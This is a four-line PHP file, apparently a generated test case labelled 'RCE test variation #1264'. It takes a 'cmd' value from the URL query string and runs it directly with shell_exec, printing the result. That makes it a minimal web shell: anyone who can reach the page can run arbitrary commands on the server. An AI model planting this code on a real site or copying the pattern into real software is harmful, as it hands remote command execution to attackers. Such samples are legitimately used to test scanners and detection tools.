<?php
// RCE test variation #1264
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>